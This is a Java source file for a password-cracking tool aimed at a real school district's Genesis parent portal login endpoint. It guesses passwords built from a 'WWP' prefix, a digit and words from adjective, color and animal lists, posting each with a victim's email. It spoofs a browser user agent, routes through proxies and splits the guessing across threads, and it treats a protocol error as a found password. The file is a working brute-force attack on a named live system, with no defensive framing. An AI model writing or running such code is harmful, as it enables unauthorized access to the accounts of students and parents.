package me.synterxis.genesis.impl;

import me.synterxis.genesis.GenesisCracker;
import me.synterxis.genesis.utils.Check;
import okhttp3.*;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.ProtocolException;
import java.net.Proxy;
import java.util.ArrayList;
import java.util.List;

public class GenesisCrackerImpl implements GenesisCracker {

    protected final MediaType CONTENT_TYPE = MediaType.parse("application/x-www-form-urlencoded");
    protected Proxy proxy;
    protected OkHttpClient.Builder builder;
    protected OkHttpClient client;

    protected double start;
    protected int tries;
    protected double maxTries;

    public final String AUTH_URL = "https://parents.ww-p.org/genesis/j_security_check";

    protected InputStream adjectiveFile;
    protected InputStream colorFile;
    protected InputStream animalFile;

    protected String email;
    protected String password;

    protected boolean canceled;

    public GenesisCrackerImpl(OkHttpClient.Builder builder, Proxy proxy) {
        this.tries = 0;
        this.builder = builder;
        this.proxy = proxy;
        this.client = this.builder.build();
    }

    public GenesisCracker setAdjectiveFile(InputStream stream) {
        this.adjectiveFile = stream;
        return this;
    }

    public GenesisCracker setColorFile(InputStream stream) {
        this.colorFile = stream;
        return this;
    }

    public GenesisCracker setAnimalFile(InputStream stream) {
        this.animalFile = stream;
        return this;
    }

    public GenesisCracker setEmail(String email) {
        this.email = email;
        return this;
    }

    public GenesisCracker setMaxTries(double tries) {
        this.maxTries = tries;
        return this;
    }

    public GenesisCracker setStart(double start) {
        this.start = start;
        return this;
    }

    public int getTries() {
        return this.tries;
    }

    public Proxy getProxy() {
        return this.proxy;
    }

    public String getPassword() {
        return this.password;
    }

    public void cancel() {
        this.canceled = true;
    }

    public boolean crack() throws IOException {
        if(!Check.notNull(this.adjectiveFile, this.colorFile, this.animalFile, this.email)) return false;

        List<String> ad = new ArrayList<>();
        List<String> co = new ArrayList<>();
        List<String> an = new ArrayList<>();

        BufferedReader a = new BufferedReader(new InputStreamReader(this.adjectiveFile));
        BufferedReader b = new BufferedReader(new InputStreamReader(this.colorFile));
        BufferedReader c = new BufferedReader(new InputStreamReader(this.animalFile));

        for(String i; (i = a.readLine()) != null;) {
            ad.add(i);
        }
        for(String j; (j = b.readLine()) != null;) {
            co.add(j);
        }
        for(String k; (k = c.readLine()) != null;) {
            an.add(k);
        }

        for(int i = 0; i <= 10; i++) {
            for (String j : ad) {
                for (String k : co) {
                    for (String l : an) {

                        if(this.canceled) {
                            return false;
                        }

                        this.tries++;

                        if(this.tries > this.maxTries) {
                            System.out.println("Finished job for thread: " + this.hashCode() + ", proxy: " + this.proxy);
                            return false;
                        }

                        if(this.tries < this.start) {
                            continue;
                        }

                        String pass = "WWP" + i + j + k + l;
                        //System.out.println(pass);
                        RequestBody body = RequestBody.create(this.CONTENT_TYPE, "j_username=" + this.email + "&j_password=" + pass);
                        Request request = new Request.Builder()
                                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")
                                .url(this.AUTH_URL)
                                .post(body)
                                .build();

                        try(Response response = this.client.newCall(request).execute()) {
                            ;
                        } catch(ProtocolException e) {
                            this.password = pass;
                            return true;
                        }
                    }
                }
            }
        }

        return false;
    }
}
